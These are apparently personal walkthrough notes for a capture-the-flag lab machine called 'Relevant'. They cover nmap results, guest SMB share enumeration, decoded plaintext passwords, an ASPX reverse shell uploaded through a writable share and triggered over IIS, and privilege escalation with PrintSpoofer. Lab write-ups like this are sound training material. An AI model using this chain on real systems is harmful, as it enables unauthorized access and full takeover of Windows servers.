@@ -1,0 +1,100 @@
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-07-29T05:36:08+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=Relevant
+| Not valid before: 2025-07-28T05:31:04
+|_Not valid after:  2026-01-27T05:31:04
+| rdp-ntlm-info: 
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2025-07-29T05:35:29+00:00
+49663/tcp open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+
+
+
+
+
+└─$ netexec smb 10.10.102.47 -u 'guest' -p '' --shares
+SMB         10.10.102.47    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
+SMB         10.10.102.47    445    RELEVANT         [+] Relevant\guest: (Guest)
+SMB         10.10.102.47    445    RELEVANT         [*] Enumerated shares
+SMB         10.10.102.47    445    RELEVANT         Share           Permissions     Remark
+SMB         10.10.102.47    445    RELEVANT         -----           -----------     ------
+SMB         10.10.102.47    445    RELEVANT         ADMIN$                          Remote Admin
+SMB         10.10.102.47    445    RELEVANT         C$                              Default share
+SMB         10.10.102.47    445    RELEVANT         IPC$                            Remote IPC
+SMB         10.10.102.47    445    RELEVANT         nt4wrksv        READ,WRITE   
+
+└─$ smbclient //10.10.102.47/nt4wrksv
+Password for [WORKGROUP\ed]:
+Try "help" to get a list of possible commands.
+smb: \> help
+
+
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+
+echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d                                        
+Bob - !P@$$W0rD!123
+Bill - Juw4nnaM4n420696969!$$$
+
+//but the credentials not able to rdp the host.
+//noticed we have upload privi of smb, upload a aspx reverseshell
+smb: \> put shell.aspx
+
+//visit this file on port 49663
+  http://10.10.202.139:49663/nt4wrksv/shell.aspx
+//get user.txt
+
+
+c:\inetpub\wwwroot\nt4wrksv>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+
+//this account has seimpersonateprivi
+put PrintSpoofer.exe into smb dir
+
+cd c:\inetpub\wwwroot\nt4wrksv>
+c:\inetpub\wwwroot\nt4wrksv>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of c:\inetpub\wwwroot\nt4wrksv
+
+07/28/2025  11:54 PM    <DIR>          .
+07/28/2025  11:54 PM    <DIR>          ..
+07/25/2020  08:15 AM                98 passwords.txt
+07/28/2025  11:54 PM            27,136 PrintSpoofer.exe    //dont know why use this oc, and howto find it.
+
+PrintSpoofer.exe -i -e cmd
